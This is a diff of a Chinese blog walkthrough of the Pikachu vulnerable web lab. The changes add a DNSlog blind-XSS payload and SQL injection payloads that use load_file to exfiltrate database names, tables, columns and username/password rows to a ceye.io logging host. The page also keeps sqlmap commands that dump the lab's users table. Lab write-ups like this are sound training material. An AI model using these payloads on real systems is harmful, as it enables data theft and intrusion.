@@ -472,21 +472,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-31
+                    2020-08-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    15k
+                    15.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    60 分
+                    62 分
                 </div>
                 
 				
@@ -792,6 +792,10 @@
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728184942.png" alt></p>
 <p>查看提示，得到后台地址(/xssblind/admin_login.php)和账户(admin/123456)，登录后台管理界面,成功弹窗</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200728185253.png" alt></p>
+<p><strong>DNSlog盲打Payload：</strong></p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;img src="http://xss.xxxxx.ceye.io/abc>                  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807145213.png" alt></p>
 <h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p><strong>常见过滤绕过方法：</strong></p>
 <ul>
 <li>前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。</li>
@@ -1116,9 +1120,8 @@ updatexml<span class="token punctuation">(</span><span class="token punctuation"
 <li><strong>页面上没有显示位，并且没有输出SQL语句执行错误信息</strong></li>
 <li><strong>只能通过页面返回正常与不正常判断</strong></li>
 </ul>
-<p><strong>这里我就不讲盲注原理和手工盲注了，需要了解的，请看我另一篇文章：<a href="https://jwt1399.top/posts/32179.html">深入剖析SQL注入</a></strong></p>
-<p><strong>使用SqlMap实现布尔盲注</strong></p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</span>
+<p><strong>这里是字符型盲注，我就不讲盲注原理和手工盲注了，需要了解的，请看我另一篇文章：<a href="https://jwt1399.top/posts/32179.html">深入剖析SQL注入</a></strong></p>
+<h4 id="SqlMap实现布尔盲注"><a href="#SqlMap实现布尔盲注" class="headerlink" title="SqlMap实现布尔盲注"></a><strong>SqlMap实现布尔盲注</strong></h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</span>
 <span class="token comment" spellcheck="true">--threads 10 :设置线程为10，运行速度会更快</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查询数据库【pikachu】 </span>
 python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"  --dbs</span>
@@ -1132,14 +1135,23 @@ python sqlmap<span class="token punctuation">.</span>py <span class="token opera
 <span class="token comment" spellcheck="true">#获取字段信息</span>
 python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C username,password --dump --batch --threads 10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200727215251.png" alt></strong></p>
+<h4 id="DNSlog外带数据注入"><a href="#DNSlog外带数据注入" class="headerlink" title="DNSlog外带数据注入"></a><strong>DNSlog外带数据注入</strong></h4><h5 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a><strong>查询数据库</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
+
+<span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.8tiwyi.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807095247.png" alt></p>
+<h5 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a><strong>查询表</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807095519.png" alt></p>
+<h5 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a><strong>查询列</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807095617.png" alt></p>
+<h5 id="查询值"><a href="#查询值" class="headerlink" title="查询值"></a><strong>查询值</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span>'<span class="token comment" spellcheck="true">--',username,password) from users limit 0,1),'.xxxx.ceye.io\\sql_test'))),1,0)#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200807102111.png" alt></p>
 <h3 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a><strong>盲注(base on time)</strong></h3><p><strong>时间注入利用情景</strong></p>
 <ul>
 <li><strong>页面上没有显示位</strong></li>
 <li><strong>没有输出报错语句</strong></li>
 <li><strong>正确的sql语句和错误的sql语句页面返回一致</strong></li>
 </ul>
-<p><strong>SqlMap实现时间盲注</strong></p>
-<pre><code>--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
+<h4 id="SqlMap实现时间盲注"><a href="#SqlMap实现时间盲注" class="headerlink" title="SqlMap实现时间盲注"></a><strong>SqlMap实现时间盲注</strong></h4><pre><code>--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
 --technique:选择注入技术，-T:Time-based blind  （基于时间延迟注入）
 --threads 10 :设置线程为10，运行速度会更快。</code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查询数据库 #【pikachu】</span>
 python sqlmap.py -u <span class="token string">"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#"</span> --technique T --current-db --batch --threads 10
@@ -1152,6 +1164,10 @@ python sqlmap.py -u <span class="token string">"http://192.168.137.1/pikachu-mas
 
 <span class="token comment" spellcheck="true">#获取字段信息</span>
 python sqlmap.py -u <span class="token string">"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#"</span> --technique T -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads 10 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="DNSlog外带数据注入-1"><a href="#DNSlog外带数据注入-1" class="headerlink" title="DNSlog外带数据注入"></a><strong>DNSlog外带数据注入</strong></h4><h5 id="查询数据库-1"><a href="#查询数据库-1" class="headerlink" title="查询数据库"></a><strong>查询数据库</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="查询表-1"><a href="#查询表-1" class="headerlink" title="查询表"></a><strong>查询表</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="查询列-1"><a href="#查询列-1" class="headerlink" title="查询列"></a><strong>查询列</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="查询值-1"><a href="#查询值-1" class="headerlink" title="查询值"></a><strong>查询值</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span>'<span class="token comment" spellcheck="true">--',username,password) from users limit 0,1),'.xxxx.ceye.io\\sql_test'))),1,0)#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h3><p><strong>这里我就不讲原理了，需要了解宽字节注入原理的，请看我另一篇文章：<a href="https://jwt1399.top/posts/32179.html">深入剖析SQL注入</a></strong></p>
 <p><strong>通过测试，发现这是post传参，所以BurpSuite抓包进行测试。</strong></p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#确定字段数</span>
@@ -2541,7 +2557,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">179.7k</span>&nbsp;字
+                class="white-color">180k</span>&nbsp;字
             
             
             
